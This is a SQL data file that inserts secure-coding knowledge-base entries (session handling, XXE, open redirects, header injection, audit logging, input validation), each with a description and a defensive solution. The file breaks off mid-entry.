INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# The login functionality should always generate (and use) a new session id  NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an user is successfully authenticated the application should generate aNEWLINEnew session cookie.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe login functionality should always generate (and use) a new session id after aNEWLINEsuccessful login. This is done to prevent an attacker doing a session fixation attackNEWLINEon your users.NEWLINENEWLINESome frameworks do not provide the possibility to change the session id on login such asNEWLINE.net applications. Whenever this problem occurs you could set an extra random cookie onNEWLINElogin  with a strong token and store this value in a session variable.NEWLINENEWLINENow you can compare the cookie value with the session variable in order to preventNEWLINEsession fixation since the authentication does not solely relies on the session id sinceNEWLINEthe random cookie can not be predicted or fixated by the attacker.NEWLINE', 'The login functionality should always generate a new session id'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Does the application enforce the use of secure passwordsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen an application does not enforce the use of secure passwords,NEWLINEthese passwords could easily be brute-forced thus compromising the users account.NEWLINENEWLINE## Solution:NEWLINENEWLINEThe user should be enforced to use secure passwords. This can be done by using aNEWLINEpassphrase policy. Also known top 1000 passwords should also be forbidden.NEWLINENEWLINE## NOTE:NEWLINENever put restrictions on the password the user submits. Some applications forNEWLINEinstance do not allow passwords longer than twenty chars. This is an example of badNEWLINEpractice since the password must be allowed as strong as the users wants it to be.NEWLINE', 'Does The application enforce the use of secure passwords'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# XXE injectionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEProcessing of an Xml eXternal Entity containing tainted data may lead to disclosure ofNEWLINEconfidential information and other system impacts.NEWLINEThe XML 1.0 standard defines the structure of an XML document.NEWLINEThe standard defines a concept called an entity, which is a storage unit of some type.NEWLINENEWLINEThere exists a specific type of entity, an external general parsed entity often shortenedNEWLINEto an external entity, that can access local or remote content via a declared systemNEWLINEidentifier and the XML processor may disclose confidential information normally notNEWLINEaccessible by the application. Attacks can include disclosing local files, which mayNEWLINEcontain sensitive data such as passwords or privateNEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDisable the possibility to fetch resources from an external source.NEWLINEThis is normally done in the configuration of the used XML parser.NEWLINE', 'XXE injections'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Session IDs do not timeout (idl)NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAll sessions should implement an idle or inactivity timeout.NEWLINEThis timeout defines the amount of time a session will remain active in case there is noNEWLINEactivity in the session, closing and invalidating the session upon the defined idle periodNEWLINEsince the last HTTP request received by the web application for a given session ID.NEWLINEThe idle timeout limits the chances an attacker has to guess and use a valid session IDNEWLINEfrom another user. However, if the attacker is able to hijack a given session,NEWLINEthe idle timeout does not limit the attacker''s actions, as he can generate activity onNEWLINEthe session periodically to keep the session active for longer periods of time.NEWLINENEWLINESession timeout management and expiration must be enforced server-side. If the client isNEWLINEused to enforce the session timeout, for example using the session token or other clientNEWLINEparameters to track time references (e.g. number of minutes since login time), an attackerNEWLINEcould manipulate these to extend the session duration.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAll user sessions should time-out based on logic server-side in order to decrease anNEWLINEattackers attack vector on the user session.NEWLINE', 'Session IDs do not timeout.(idl)'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Directory listingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever directory listing is enabled an attacker could gain sensitive information aboutNEWLINEthe systems hierarchical structure and gain knowledge about directories or files which shouldNEWLINEpossibly not be publicly accessible. An attacker could use this information toNEWLINEincrease his attack vector. In some cases this could even lead to an attacker gaining knowledge aboutNEWLINEcredentials or old vulnerable system demo functions which might lead to remote code execution.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDifferent types of servers require a different type of approach in order to disableNEWLINEdirectory listing. For instance: apache uses a .htacces in order to disable directory listing.NEWLINEAs in iis7 directory listing is disabled by default.NEWLINE', 'Directory listing'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Unnecessary features enabled or installedNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever there are unnecessary features enabled or installed this could increaseNEWLINEthe attack vector which could lead to serious danger such as XXE/CMD/XSS injections.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEMake sure all features and software available on the application/server is necessary forNEWLINEapplication to work proper. If not, uninstall or disable these services.NEWLINE', 'Unnecessary features enabled or installed'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Avoid the use of default and predictable accountsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever default or predictable accounts are available on an application/server this couldNEWLINElead to an attacker compromising these services. Make sure all default and predictableNEWLINEaccounts are disabled or deleted from the services.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all keys and passwords are replaceable, and are generated orNEWLINEreplaced after installation time.NEWLINE', 'Avoid the use of default and predictable acounts.'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Security settings in your development frameworksNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever certain security settings in your application frameworksNEWLINE(e.g., Struts, Spring, ASP.NET) and libraries are not set to secure values this could leadNEWLINEto vulnerabilities in your application which an attacker could exploit.NEWLINENEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEMake sure all your security settings in your development framework are set to secure values.NEWLINEThis can be checked by using hardening guides.NEWLINE', 'Security settings in your development frameworks'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Insecure datastorageNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever sensitive data is stored clear-text this data is compromised as soon as itNEWLINEfalls into the hands of an attacker.NEWLINENEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESensitive data in all forms should always be stored by an encrypted manner.NEWLINEWe recommend to follow the "Secure Cryptographic datastorage" cheatsheet found on OWASP.NEWLINENEWLINEhttps://www.owasp.org/index.php/Cryptographic_Storage_Cheat_SheetNEWLINE', 'Insecure datastorage'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Authentication based on the knowledge of a secret URLNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThis is a form of security by obscurity. Whenever an attacker manages to fuzz or spiderNEWLINEthis url the application could compromise whatever is behind this url.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAlways implement proper authentication mechanisms that is not using a static authentication URL.NEWLINE', 'Authentication based on the knowledge of a secret URL'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Open forward and Open redirectsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEUnvalidated redirects and forwards are possible when a web application accepts untrustedNEWLINEinput that could cause the web application to redirect the request to a URL containedNEWLINEwithin untrusted input. By modifying untrusted URL input to a malicious site, an attackerNEWLINEmay successfully launch a phishing scam and steal user credentials. Because the serverNEWLINEname in the modified link is identical to the original site, phishing attempts may haveNEWLINEa more trustworthy appearance. Unvalidated redirect and forward attacks can also be usedNEWLINEto maliciously craft a URL that would pass the application''s access control check andNEWLINEthen forward the attacker to privileged functions that they would normally not be ableNEWLINEto access.NEWLINENEWLINE## Solution:NEWLINENEWLINEUse a whitelisting method for determining where the user should be redirected towards.NEWLINEYou could also show a warning when redirecting to potentially untrusted content.NEWLINE', 'Open forward and Open redirects'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Incorrect or missing charset NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen the browser has to guess the charset according of the content that is presented byNEWLINEthe application, then this could could lead to XSS injections when guessing wrong.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDefine the charset for all your pages in order to prevent the browser for guessingNEWLINEthe content types.NEWLINENEWLINEThis could be done by adding a meta header in the head of your HTML like:NEWLINENEWLINEFor HTML4:NEWLINE```htmlNEWLINE<meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1">NEWLINE```NEWLINEFor HTML5:NEWLINE```htmlNEWLINE<meta charset="UTF-8">NEWLINE```NEWLINEOr simply by setting content-type headers by your server-side language,NEWLINEC# example of a content type header:NEWLINEResponse.AppendHeader("Content-Type:text/html", "charset=UTF-8");NEWLINE', 'Incorrect or missing charset'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Extraneous files in document rootNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever the document root contains extraneous files, these files could be accessed by anNEWLINEattacker or could possibly contain functionality witch could contain other vulnerabilities.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEExtraneous files in document root should be investigated and deleted if it''s not necessaryNEWLINEfor operation of the application.NEWLINE', 'extraneous files in document root'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# X-Path injectionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWeb applications heavily use databases to store and access the data they need for theirNEWLINEoperations. Historically, relational databases have been by far the most commonNEWLINEtechnology for data storage, but, in the last years, we are witnessing an increasingNEWLINEpopularity for databases that organise data using the XML language.NEWLINEJust like relational databases are accessed via SQL language, XML databases use X-Path asNEWLINEtheir standard query language.NEWLINENEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEJust like the techniques to avoid SQL injection, you need to use a parameterised X-PathNEWLINEinterface if one is available, or escape the user input to make it safe to include in aNEWLINEdynamically constructed query. If you are using quotes to terminate untrusted input in aNEWLINEdynamically constructed X-Path query, then you need to escape that quote in the untrustedNEWLINEinput to ensure the untrusted data can not try to breakNEWLINEout of that quoted context.NEWLINE', 'X Path injections'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Username enumerationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an application generates an error like:NEWLINENEWLINE"This username already exists"NEWLINENEWLINEAn attacker could enumerate these usernames, enlarging his chance for a successfulNEWLINEbrute-force attack. Same goes for "Password forget" functions.NEWLINENEWLINEWhenever an user forgot his password, make him fill in his email addressNEWLINErather than an username.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAll error messages should be generalized in order to prevent username enumeration.NEWLINEAlso sometimes you cannot avoid information leaking in functionalities such as aNEWLINEregistration page. Here you need to use tar-pitting methods to prevent an automatedNEWLINEattack by an attacker.NEWLINENEWLINEAlso recommended knowledge-base item:NEWLINENEWLINE- Differential analysis attackNEWLINE', 'Username enumeration'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# HTTP header injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEHTTP header injection is a general class of web application security vulnerability whichNEWLINEoccurs when Hypertext Transfer Protocol (HTTP) headers areNEWLINEdynamically generated based on user input. Header injection in HTTP responses can allowNEWLINEfor HTTP response splitting (also known as CRLF, Carriage Return Line Feed),NEWLINESession fixation via the Set-Cookie header, cross-site scripting (XSS),NEWLINEand malicious redirect attacks via the location header. HTTP header injection is aNEWLINErelatively new area for web-based attacks, and has primarily been pioneeredNEWLINEby Amit Klein in his work on request/response smuggling/splitting.NEWLINEVulnerabilities due to HTTP header injections such as CRLF are no longerNEWLINEfeasible due to the fact that multiple header requests are not possible.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhen user-input will be used in HTTP headers then the newlines should be escaped in aNEWLINEcorrect manner. Recommended would be a whitelist of expected input or use a validation methodNEWLINEwhich for example only accepts alphanumeric values. Every detection of input which is out ofNEWLINEthe intended operation should be rejected.NEWLINE', 'HTTP header injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# GET/POST requestsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAuthors of services which use the HTTP protocol SHOULD NOT use GET based forms for theNEWLINEsubmission of sensitive data, because this will cause this data to beNEWLINEencoded in the Request-URI. Many existing servers, proxies,NEWLINEand browsers will log the request URI in some place where it might beNEWLINEvisible to third parties. Servers can use POST-based form submission instead.NEWLINEGET parameters are also more likely to be vulnerable to XSS. Please refer to theNEWLINEXSS manual in the knowledge base for more information.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhenever transmitting sensitive data always do this by means of the POST request or by header.NEWLINENote: Avoid user-input in your application header, this could lead to vulnerabilities.NEWLINEAlso make sure you also disable all other HTTP request methods which are unnecessary forNEWLINEyour applications operation such as: REST, PUT, TRACE, DELETE, OPTIONS, etc, sinceNEWLINEallowing these other request methods could lead to vulnerabilities and injections.NEWLINE', 'GET POST requests'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Insecure internal communicationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever organizations communicate by means of unencrypted connections, an attackerNEWLINEcould easily sniff these insecure communication and gain sensitive information.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEUse TLS encrypted data lines for all internal communication channels.NEWLINEAlso your infrastructure should not traverse unencrypted or weakly encrypted links. BecauseNEWLINEif so, than all your data''s integrity and confidentiality will be lost.NEWLINE', 'Insecure internal communication'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Sensitive information stored alongside the source codeNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESometimes when developing an application a programmer stores a password or otherNEWLINEcredentials into the source-code as a comment for other developers toNEWLINElogin into the application. When these comments still exist in a live environment,NEWLINEan attacker could use these credentials to gain access to the system.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESearch your source code for comments which contains possible user-credentials.NEWLINEYou should also verify that there are no secrets and API keys are included in theNEWLINEsource code, or end up within the resulting binary.NEWLINENEWLINEThis also goes for providing information about business logic and other critical sensitiveNEWLINEinformation. Verify that there is no sensitive business logic, secret keys or otherNEWLINEproprietary information in client side code.NEWLINE', 'Sensitive information stored alongside the source code'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# The possible risks to the application must be documentedNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe information that is stored of the application and/or userNEWLINEactivities needs to be documented, this will make it transparent where sensitiveNEWLINEinformation is stored and why.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINECreate a section in the documentation of the project that defines the informationNEWLINEthat will be stored. This makes it easier to make estimations about critical partsNEWLINEof your application which deserve extra attention.NEWLINE', 'The possible risks to the application must be documented'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Possible attackers of the application must be documentedNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEActivity logs of the hackers session is very valuable information and is very helpfulNEWLINEwhen investigating a hack on an application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe possible attackers needs to be monitored as much as possible. This information isNEWLINEcrucial for forensics and law enforcements.NEWLINENEWLINERecommended knowlege-base items:NEWLINENEWLINE- Audit logsNEWLINE- User credentials in audit logsNEWLINE- Log injectionNEWLINE- Repudiation attacksNEWLINE- Logging guidelinesNEWLINE- Logging is performed before executing the transactionNEWLINE', 'Possible attackers of the application must be documented'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Audit logsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAn audit trail (also called audit log) is a security-relevant chronological record,NEWLINEset of records, and/or destination and source of records that provide documentaryNEWLINEevidence of the sequence of activities that have affected at any time a specific operation,NEWLINEprocedure, or event.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAn audit log should contain the following items:NEWLINENEWLINE-User idNEWLINE-OperationNEWLINE-Success/failure of the operationNEWLINE-PrivilegesNEWLINE-TimestampNEWLINENEWLINEDepending on the gravity of the users violation there should also be a record kept forNEWLINEeach user to lock their accounts after a certain number of violations. This should beNEWLINEapplied since we can now assume it is an attacker trying to compromise your application.NEWLINENEWLINEAlso when doing audit logs make sure you always do logging before action in case theNEWLINEaction is not properly processed or terminated by your application. When using thisNEWLINEapproach you are always in possession of an complete audit trail.NEWLINE', 'Audit logs'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# User credentials in audit logsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever there are user credentials supplied in an audit log,NEWLINEthis could become a risk whenever an attacker could gain access to one of these log files.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEInstead of storing user credentials, you may want to use user id''s in order toNEWLINEidentify the user in the log files.NEWLINENEWLINERecommended knowledge-base item:NEWLINENEWLINE- Logging guidelinesNEWLINE', 'User credentials in audit logs'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Intrusion detecting and reportingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAll possible attacks on your application should be detected an reported in order toNEWLINEprevent further escalation.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIntrusion detecting could be done by means of a:NEWLINENEWLINE"Positive security model:"NEWLINEIn this model you create certain regular expressions in order to only make the applicationNEWLINEpass the so called "known good".NEWLINEWhenever an application detects strange behavior and anomalies,NEWLINEthese issues should be reported. Keep in mind whenever the application changes thisNEWLINEwhitelist method has to evolve alongside with it. A big con is it could generate a lotNEWLINEof reports and alerts.NEWLINENEWLINENEWLINE"Negative security model:"NEWLINECreate a blacklist with known attacks and malicious input and make the application reportNEWLINEon detection of this input. You could also prioritise different malicious input andNEWLINEclassify them into different groups.NEWLINENEWLINEWhatever method you may choose to prefer, you should always ensure error handling logic inNEWLINEsecurity controls denies access by default. With this approach applied you will have aNEWLINEhigher probability that whenever an attacker manages to break your applications intendedNEWLINEoperation, it will not fail in a way which increases his attack vector.NEWLINE', 'Intrusion detecting and reporting'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# XML injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEXML Injection is an attack technique used to manipulate or compromise the logic of an XMLNEWLINEapplication or service. The injection of unintended XML content and/or structures intoNEWLINEan XML message can alter the intend logic of the application. Further, XML injectionNEWLINEcan cause the insertion of malicious content into the resulting message/document.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIn addition to the existing input validation, define a positive approach whichNEWLINEescapes/encodes characters that can be interpreted as xml. At a minimum this includesNEWLINEthe following: < > / " ''NEWLINE', 'XML injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Authentication at a central locationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAuthentication should always be performed at a central location in the application inNEWLINEorder to prevent missing authentication on certain levels in the application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEUse a central location for authentication. If u want to put extra constraints on theNEWLINEusers for accessing critical parts of your application you have to implementNEWLINEstep-up or adaptive authentication mechanisms.NEWLINENEWLINEVerify that alternative and less secure access paths do not exist.NEWLINE', 'Authentication at a central location'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# IP address in internal HTTP headersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever IP addresses are used in HTTP headers in internal structures of your organization,NEWLINEan attacker could use these to enlarge his attack vector and recon yourNEWLINEinternal infrastructures.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINENever use IP addresses in internal HTTP headers.NEWLINE', 'IP adresses in internal HTTP headers'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Authentication enforced by the web-severNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAuthentication should be enforced by the web-server. Whenever these configurations areNEWLINEnot enabled on the server an attacker could gain access to authorizedNEWLINEpages on your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAlways make sure your web-server is correctly configured to enforce authentication,NEWLINEsuch as a session management implementation.NEWLINE', 'Authentication enforced by the web sever'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# The audit log must include a priority system.NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIf the audit log does not contain a clear priority system it will be difficult toNEWLINEprioritize different types of process failures.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhenever the web-application is writing error messages to the error log then these needNEWLINEto have a correct priority label. The labels that you can use are LOW, MEDIUM and HIGH.NEWLINEThese labels can then be used at a later moment in time for easy and quick analysingNEWLINEcapabilities of the log files.NEWLINENEWLINEYou should also verify security logging controls provide the ability to log success andNEWLINEparticularly failure events that are identified as security-relevant.NEWLINE', 'The audit log must include a priority system'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Servers must not be trusted without explicit authenticationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever the server your web-application is connecting towards is not using any form ofNEWLINEexplicit authentication and is internet facing then this results into that the serverNEWLINEcannot be trusted. This is because the server can be potentially be owned and managed byNEWLINEeverybody including hackers.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhenever the web-application is facing the internet third parties trying toNEWLINEaccess it should always use a form of authentication in order to gain access.NEWLINE', 'Servers must not be trusted without explicit authentication'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Ensure overall securityNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESome parts of the application at first sight might seem to acquire a higher level ofNEWLINEsecurity than i.e unauthorized/public parts of the application.NEWLINEThis however is not true since breaching public parts could also lead to an attackerNEWLINEcompromising the application or other users accounts.NEWLINENEWLINE## Solution:NEWLINENEWLINEAlways ensure full hardened security on all layers of the web application.NEWLINENEWLINERecommended knowledge-base item:NEWLINENEWLINE- High level architecture should be definedNEWLINE', 'Ensure overall security'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Re-authenticationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a user is changing credentials such as his password, the user should always beNEWLINEchallenged by the application to re-authenticate himself. This is in order to prevent anNEWLINEattacker to change credentials if ever an attacker could hijack another users session.NEWLINENEWLINEVerify that the changing password functionality includes the old password,NEWLINEthe new password, and a password confirmation, as well as a passphrase strength indicationNEWLINEto encourage the adoption of strong password phrases.  NEWLINENEWLINE## Solution:NEWLINENEWLINEA user should always be challenged by the application to re-authenticate themselves afterNEWLINEchanging their credentials, e-mail or doing other important data exchanges such asNEWLINEtransferring money. You could also consider using step up, adaptive authentication orNEWLINEtwo factor authentication, or transaction signing depending on how critical yourNEWLINEapplication is.NEWLINENEWLINERecommended knowledge base item:NEWLINENEWLINE- Step up or adaptive authenticationNEWLINE', 'Re authentication'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# No shared knowledge for secret questionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an application ask an user a secret question such as for i.e a password forgotNEWLINEfunctionality, these questions should not be shared knowledge an attacker could get fromNEWLINEthe web to prevent him compromising the account by this function.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESecret questions should never include shared knowledge, predictable or easyNEWLINEguessable values.NEWLINE', 'No shared knowledge for secret questions'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Disallow the use of old passwordsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThis is a mitigation of the risk that a password can leak by any means towards a possible,NEWLINEattacker. By changing the password to a new one minimizes the damage.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEKeep the old entries of the password record of the user. If the user changes his passwordNEWLINEyou can match against the old entries to validate it is not an old one.NEWLINE', 'Disallow the use of old passwords'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Absolute session time-outNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAll sessions should implement an absolute timeout, regardless of session activity.NEWLINEThis timeout defines the maximum amount of time a session can be active,NEWLINEclosing and invalidating the session upon the defined absolute period since the givenNEWLINEsession was initially created by the web application. After invalidating the session,NEWLINEthe user is forced to (re)authenticate again in the web application and establishNEWLINEa new session. The absolute session limits the amount of time an attacker can use aNEWLINEhijacked session and impersonate the victim user.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAlways ensure that sessions absolute time-out server-side in order to decrease a hackersNEWLINEattack vector.NEWLINE', 'Absolute session time out'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# XSLT injectionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe vulnerability occurs when a XSL file is loaded from a source controlled by an attacker.NEWLINEWhen the attacker is given the opportunity to specify the source of the included XSL fileNEWLINEhe could include a file which contains malicious code to be parsed on the target application.NEWLINEThis could lead to, code execution, reading arbitrary files and many moreNEWLINEvulnerabilities such as XSS.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINETo protect against such vulnerability one needs to make sure that he does not useNEWLINEuser-supplied input in the XSL filename.NEWLINEThe best solution would be to define a list of permitted filenames andNEWLINEonly accept XSL filenames from that list.NEWLINE', 'XSLT injections'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Logout structuringNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEPlacing a logout link on every page that requires authentication helps the user end theNEWLINEsession when he is done with the site. Ending the session helps prevent hijacking.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIdentify all pages that use authentication. Make a list of all pages on your site that useNEWLINEauthentication then verify the presence of logout links. Examine each page that usesNEWLINEauthentication to make sure it has a logout link in a location that can beNEWLINEfound intuitively.NEWLINE', 'Logout structuring'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Verify that the session id is never disclosedNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIf the session id is disclosed in the URL the users session id can be easily obtained byNEWLINEan attacker and could leak through the referrer header towards other severs. Also wheneverNEWLINEthe session id is disclosed in the URL the possibility also arises to perform otherNEWLINEattacks like session fixation which could lead to session hijacking.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESession id should never be included in places other than the application cookie header.NEWLINE', 'Verify that the session id is never disclosed'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Session cookies (Domain)NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe Domain option allows you to specify whether or not to send the cookie to subdomains.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESetting www.example.com will mean only the exact domain www.example.com willNEWLINEbe matched, while .example.com (wildcard) will also match again anyNEWLINEsubdomain (forums.example.com, blog.example.com).NEWLINENEWLINEThe use of a wildcard is not recommended at all and should be avoided.NEWLINENEWLINEThere are a lot of different mitigations in order to harden your session management.NEWLINEThese mitigations are amongst others the setting of the "HttpOnly and secure" flags onNEWLINEyour sessions. Follow the "Sessions pattern" list to make sure your session management isNEWLINEsecure.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Cross subdomain cookie attacksNEWLINE- Sessions patternNEWLINE', 'Session Domain cookies'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Access control failureNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEHandling errors securely is a key aspect of secure coding. There are two types of errorsNEWLINEthat deserve special attention. The first is exceptions that occur in the processing of aNEWLINEsecurity control itself. It is important that these exceptions do not enable behaviourNEWLINEthat the countermeasures would normally not allow. As a developer, you should considerNEWLINEthat there are generally three possible outcomes from a securityNEWLINEmechanism: allow the operation, disallow the operation, exception In general.NEWLINEYou should design your security mechanism so that a failure will follow the sameNEWLINEexecution path as disallowing the operation.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESecurity methods like isAuthorized(), isAuthenticated(), and validate() should all returnNEWLINEfalse if there is an exception during processing.NEWLINEIf security controls can throw exceptions, they must be very clear about exactly what thatNEWLINEcondition means.NEWLINE', 'Access control failure'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Input rejectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever the application detects malicious or unexpected user-input you want to make sureNEWLINEthe application actual rejects the submitted user-input rather than directly process it.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that the application actually rejects the user requests whenever malicious inputNEWLINEis detected by your application. The base of this process will be checking the applicationNEWLINEfor expected user-input, for example: Whenever the user is filling in a form whichNEWLINEcontains a checkbox, there are fixed values which your application can expect fromNEWLINEthe user to return. Whenever this value differs from what the application served the userNEWLINEas possible answers, you can assume the request was corrupted and you reject the request.NEWLINENEWLINEYou must also keep track of the users movements by adding an audit trail as well as anNEWLINEcounter for tracking the number of his violations(submitting bad input) in your inputNEWLINEvalidation class. You should enforce a lockout whenever a unreasonable number ofNEWLINEviolations are detected by your application in order to protect it from attackers.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Input validationNEWLINE- Client side input validationNEWLINE- Single input validation controlsNEWLINE- Character encodingNEWLINE', 'Input rejection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Input validationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINETo ensure that the application is robust against all forms of input data, this data shouldNEWLINEbe sanitized and/or encoded server-side since an attacker could otherwise easy bypassNEWLINEthese checks with an intercepting proxy.NEWLINENEWLINE## Solution:NEWLINENEWLINEAll input validation and encoding-routines should be implemented on the server-sideNEWLINEoutside the reach of an attacker. Just as with the input rejection you should make sure thatNEWLINEafter validating the user-input, whenever the input is bad it actually rejects, sanitizesNEWLINEor formats your user-input into not malicious data.NEWLINENEWLINEThe recommended method for validating user input would be the positive validation method.NEWLINEWhite-list input validation means allowing only input that is explicitly defined as valid,NEWLINEas opposed to black-list input validation, which filters out known bad input.NEWLINENEWLINEYou must also keep track of the users movements by adding an audit trail as well as anNEWLINEcounter for tracking the number of his violations(submitting bad input) in your inputNEWLINEvalidation class. You should enforce a lockout whenever a unreasonable number ofNEWLINEviolations are detected by your application in order to protect it from attackers.NEWLINENEWLINEAlso verify that structured data is strongly typed and validated against a defined schemaNEWLINEincluding allowed characters, length and pattern (e.g. credit card numbers or telephone,NEWLINEor validating that two related fields are reasonable, such as validating suburbs and zipNEWLINEor post codes match).NEWLINENEWLINEThis also goes for whenever you are expecting just an integer or alphanumeric values etc.NEWLINEEvery detection of input outside of the intended operation of 